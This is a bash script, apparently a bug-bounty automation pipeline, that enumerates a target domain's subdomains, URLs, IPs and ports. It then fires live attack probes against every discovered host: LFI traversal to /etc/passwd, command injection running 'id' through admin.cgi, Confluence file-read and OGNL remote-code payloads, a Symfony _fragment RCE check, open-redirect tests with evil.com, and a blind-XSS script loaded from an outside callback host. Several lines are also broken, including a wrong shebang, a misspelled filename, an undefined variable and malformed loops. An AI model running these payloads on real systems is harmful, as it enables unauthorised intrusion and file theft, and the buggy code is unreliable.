#/bin/bash 

domain=$1
# Gather Subdomain
mkdir -p $domain/subdomain/
subfinder -d $1 -silent -all | tee $domain/subdomain/subfinder.txt
findomain-linux --target $1 | tee $domain/subdomain/findomain.txt
assetfinder -subs-only $1 | tee $domain/subdomain/assetfinder.txt
sublist3r -d $1 | tee $domain/subdomain/sublister.txt
amass enum -passive -d $1 -o ~/ReconTool/abdulrahman/$domain/subdomain/amass.txt
cat $domain/subdomain/*.txt | sort -u | tee $domain/subdomain/sort_domain.txt
cat $domain/subdomain/sort_domain.txt | httpx -silent | tee $domain/subdomain/host.txt
cat $domain/subdomain/host.txt | httpx -mc 200 | tee $domain/subdomain/live-domain.txt
cat $domain/subdomain/sort_domain.txt | httpx -silent | aquatone -ports 80 443 8000 8080 8443 

#Gather URLs
mkdir -p $domain/URLs/
cat $domain/subdomain/live-domain.txt | waybackurls | sort -u | uro | tee $domain/URLs/wayback-urls.txt
gauplus $1 | sort -u | httpx -silent | tee $domain/URLs/gauplus.txt
cat $domain/subdomain/sort_domain.txt | gau | sort | uro | tee $domain/URLs/gau-urls.txt
cat $domain/URLs/*.txt | sort -u | uro | httpx -silent | tee $domain/URLs/urls.txt
cat $domain/URLs/usls.txt | httpx -mc 200 -silent | tee $domain/URLs/live-urls.txt

#Gather GF Pattern 
cat $domain/URLs/live-urls.txt | gf redirect | tee $domain/URLs/gf-redirect.txt
cat $domain/URLs/live-urls.txt | gf redirect | tee $domain/URLs/redirec.txt
cat $domain/URLs/live-urls.txt | gf xss | tee $domain/URLs/gf-xss.txt
cat $domain/URLs/live-urls.txt | gf sqli | tee $domain/URLs/gf-sqli.txt
cat $domain/URLs/live-urls.txt | gf ssrf | tee $domain/URLs/gf-ssrf.txt
cat $domain/URLs/live-urls.txt | gf lfi | tee $domain/URLs/gf-lfi.txt
cat $domain/URLs/live-urls.txt | gf idor | tee $domain/URLs/idor.txt
cat $domain/URLs/live-urls.txt | gf ssti | tee $domain/URLs/ssti.txt

# cat $domain/URLs/gau-urls.txt | gau -subs | grep "https://" | grep -v | "png\|jpg\|css\|js\|gif\|txt" | grep "=" | uro | dalfox pipe --deep-domxss --multicast --blind {xss.hunter.xt}
#IP Scan
mkdir -p $domain/IP/  
subfinder -d $1 | dnsx -a -resp-only | tee $domain/IP/Ipa.txt
cat $domain/subdomain/live-domain.txt | dnsx -a -resp-only -o $domain/IP/live-ipa.txt
subfinder -d $1 -silent -all | dnsx -a -resp-only | nrich - -o $domain/IP/nrich.out
subfinder -d $1 -silent | httpx -ip -silent -o $domain/IP/host-ip.txt
subfinder -d $1 -silent | httpx -asn -silent -o $domain/IP/asn.out  
subfinder -d $a -silent | httpx -cname -silent -o $domain/IP/host-cname.txt  
naabu $domain/subdomain/sort_domain.txt -o $domain/IP/open-ports.out  
#CNAME - A Record :
subfinder -d $1 | dnsx -a -cname -resp | tee $domain/IP/CNAME-A-record.txt
# censys-ip:
censys search $1 | grep "ip" | egrep -v "description" | cut -d ":" -f2 | tr -d \"\ |tee $domain/IP/censys-ip.txt
#shodan-search
shodan search Ssl.cert.subject.CN:"$1" 200 --fields ip_str | httpx -silent | tee $domain/IP/shodan-ip.txt


# Paramspider 
python3 ~/ReconTool/ParamSpider/paramspider.py -d $1 --exclude woff,.css,.js,.png,.svg,.php,.jpg 
echo "Enter your target url[ajrun]: "
read url
arjun -u $url -oT arjun.txt
# Find hidden GET parameters in javascript files
# assetfinder $1 | gau | egrep -v '(.css|.png|.jpeg|.jpg|.svg|.gif|.wolf)' | while read url; do vars=$(curl -s $url | grep -Eo "var [a-zA-Z0-9]+" | sed -e 's 'var' '"$url"?' g' -e 's/ //g' | grep -v '.js' | sed 's/.*/&=xss/g'); echo -e "\e[1;33m$url\n\e[1;32m$vars"; done | tee -a $domain/hidden-param

#Extract JS File 
mkdir -p $domain/js
echo $1 | gau | grep '\.js$' | httpx -status-code -mc 200 -silent | grep 'application/javascript' | tee $domain/js/jsfile1.txt
assetfinder $1 | gau|egrep -v '(.css|.png|.jpeg|.jpg|.svg|.gif|.wolf)' | grep ".*\.js" | tee $domain/js/jsfile2.txt
# assetfinder $1 | gau|egrep -v '(.css|.png|.jpeg|.jpg|.svg|.gif|.wolf)'|while read url; do vars=$(curl -s $url | grep -Eo "var [a-zA-Zo-9_]+" |sed -e 's  'var' '"$url"?' g' -e 's/ //g'|grep -v '.js'|sed 's/.*/&=xss/g'): echo -e "\e[1;33m$url\n" "\e[1;32m$vars";done | tee -a $domain/js/js-endpoint.txt
#Extract Endpoint & API- Endpoint
# cat $domain/jsfile.txt | grep -aoP "(?<=(\"|\'|\`))\/[a-zA-Z0-9_?&=\/\-\#\.]*(?=(\"|\'|\`))" | sort -u | tee $domain/js/extracted-endpoint.txt		
# cat $domain/js/jsfile2.txt | grep -RoP "(\/[a-zA-Z0-9_\-]+)+" | sort -u | uro | tee -a $domain/js/endpoint.txt
# assetfinder $1 | waybackurls | grep -E "\.json(?:onp?)?$" | anew
# cat main.js | grep -oh "\"\/[a-zA-Z0-9_/?=&]*\"" | sed -e 's/^"//' -e 's/"$//' | sort -u



#Nabbu Port discovery:
cat $domain/subdomain/sort_domain.txt | assetfinder -subs-only | naabu -sa -silent -nc -tp 80 -p 80 443 8080 8443 8090 9000 9001 9002 9003 | aquatone -out aquatone_screenshots | tee -a $domain/port-scan
cat $domain/subdomain/sort_domain.txt | assetfinder | httprobe -c 50 -p http:80 http:8080 https:443 https:8443 http:9000 http:9001 http:9002 http:9003 | aquatone  -out screenshots -threads 50 | tee -a $domain/port-scan2

#wordpres sqli:
cat $domain/subdomain/host.txt | httpx --cl -silent -path "/wp-content/mysql.sql" -mc 200 -t 250 -p 80 443 8080 8443  | anew $domain/myP1s.txt

#Scanning For XSS:
mkdir -p $domain/XSS/
cat $domain/URLs/gf-xss.txt | kxss | tee -a $domain/XSS/kxss.txt
cat $domain/output/*.txt | sed 's/FUZZ//g' | kxss | tee -a $domain/XSS/kxx2.txt
# Scanning Blind xss
# cat $domain/subdomain/host.txt | waybackurls | httpx -H "User-Agent: \"><script src=$abdulrahman2x.xss.ht></script>"
# waybackurls $1 | gf xss | sed 's/=.*/=/' | sort -u | tee $domain/XSS/Possible_xss.txt && cat $domain/XSS/Possible_xss.txt | dalfox -b https://abdulrahman2x.xss.ht pipe > output.txt

#Scanning for SSTI
# cat $domain/subdomain/subfinder.txt | httpx -silent -status-code | gauplus -random-agent -t 200 | qsreplace “aaa%20%7C%7C%20id%3B%20x” > fuzzing.txt
# ffuf -ac -u FUZZ -w fuzzing.txt -replay-proxy 127.0.0.1:8080

# Scanning For CORS:
echo "Enter your domain URL For checking CORS:"
read cors
curl $cors -I -H Origin:evil.com | tee $domain/cors.txt

#CRLF Scanning:
crlfuzz -l $domain/subdomain/live-domain.txt -o $domain/CRLF-scan.txt

#Subdomain-takeover
cat $domain/subdomain/host.txt | nuclei -t ~/subdomain-takeover.yaml | tee $domain/subdomain-takeover.out  
subzy -targets $domain/subdomain/host.txt --hide_fails --concurrency 100 | tee $domain/subdomain-takeover2.txt

#Scanning for Open-Redirect:
waybackurls $1 | grep "=http" | qsreplace "https://evil.com" | while read host do;do curl -s -L  $host -I|grep "evil.com" && echo "$host \033[0;31mVulnerable\n" || echo "$host \033[0;32mNot Vulnerable\n";done |tee -a $domain/URLs/Vuln-open-redirect.txt
waybackurls $1 | grep -a -i \=http | qsreplace 'http://evil.com' | while read host do;do curl -s -L $host -I | grep "evil.com" && echo -e "$host \033[0;31mVulnerable\n" ;done | tee -a $domain/URLs/Vuln-open-redirect2.txt
waybackurls $1 | gf redirect | qsreplace 'http://evil.com' | while read host do;do curl -s -L $host -I | grep "evil.com" && echo -e "$host \033[0;31mVulnerable\n" ;done
waybackurls $1 | gf redirect | qsreplace 'http://evil.com' | while read host do;do curl -s -L $host -I | grep "evil.com" && echo -e "$host \033[0;31mVulnerable\n" ;done | httpx -sc -silent


#Scanning for LFI:
mkdir -p $domain/LFI 
gau $1  | egrep -v ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg|txt|js)" | gf lfi | qsreplace "/etc/passwd" | while read host do ; do curl --silent --path-as-is --insecure "$host" | grep -qs "root:" && echo "$host \033[0;31mVulnerable\n" || echo "$host \033[0;32mNot Vulnerable\n";done | tee $domain/LFI/lfi.out
waybackurls $1 | gf lfi | qsreplace "/etc/passwd" | while read host do;do curl --insecure -s "$host" | grep "root:";done | tee -a $domain/LFI/lfi2.out
cat $domain/URLs/gf-lfi.txt | httpx -nc -t 250 -p 80 443 8080 8443 4443 8888 -path "///////../../../etc/passwd" -mr "root:x" | anew $domain/LFI/LfimyP1s.txt
cat $domain/subdomain/host.txt | httpx -nc -t 300 -p 80 443 8080 8443 8888 8088 -path "/jobmanager/logs/..%252f..%252f..%252f......%252f..%252fetc%252fpasswd"  -mr "root:x" -silent | tee -a $domain/LFI/lfi3.out  
cat $domain/subdomain/host.txt | gau |  gf lfi |  httpx -path /usr/share/wordlists/OneListForAll/dict/lfi_short.txt -threads 100 -random-agent -x GET POST  -tech-detect -status-code  -follow-redirects -mc 200 -mr "root:[x*]:0:0:" | tee $domain/LFI/lfi4.out  


#nuclie scanning:
mkdir -p $domain/nuclei
cat $domain/subdomain/host.txt | nuclei -t ~/nuclei-templates --severity critical high medium low -c 500 --bulk-size 500 | tee $domain/nuclei.out
# cat $domain/subdomain/host.txt | assetfinder -subs-only | httpx -silent -p 80 443 8080 8443 9000 9001 9002 9003 -nc  | nuclei -t ~/nuclei-templates/ --severity critical high medium low -silent
cat $domain/subdomain/live-domain.txt | nuclei -t ~/TP5_Arbitrary_file_read.yaml
rustscan -a $domain/IP/live-ipa.txt -r 1-65535 | grep Open | tee $domain/IP/open-ports.txt | sed 's/Open//' | httpx -silent | nuclei -t ~/nuclei-templates | tee rustscan-result.out  


# OS Command Injection:
cat $domain/subdomain/host.txt | httpx -path "/cgi-bin/admin.cgi?Command=sysCommand&Cmd=id" -nc -ports 80 443 8080 8443 -mr "uid=" -silent | tee $domain/os-injection.out  

# RCE oneliner:
httpx -l $domain/subdomain/host.txt -path /_fragment?_path=_controller=phpcredits&flag=-1 -threads 100 -random-agent -x GET  -tech-detect -status-code  -follow-redirects -title -mc 200 -match-regex "PHP Credits"

# Scanning confluence - onliner ; 
# Use this tool detect - ONGL injection vulnerability: git clone https://github.com/Nwqda/CVE-2022-26134
# curl --head -k "https://YOUR+TARGET.com/%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%22cat%20%2Fetc%2Fpasswd%22%29.getInputStream%28%29%2C%22utf-8%22%29%29.%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22X-Cmd-Response%22%2C%23a%29%29%7D"
# Atlassian Confluence Arbitrary File Read (CVE-2021-26085)
cat $domain/subdomain/host.txt | httpx -nc -t 300 -p 80,443,8080,8443 -silent -path "/s/123cfx/_/;/WEB-INF/classes/seraph-config.xml" -mc 200 | tee $domain/attlassian.txt


 #Scan for SQL
python3 ~/ReconTool/SQLiDetector/sqlidetector.py -f $domain/URLs/gf-sqli.txt -w 50 -o $domain/sqli-ouput.txt
cat $domain/URLs/gf-sqli.txt | nuclei -t ~/sqli.yaml -o $domain/sqli-yaml.out  













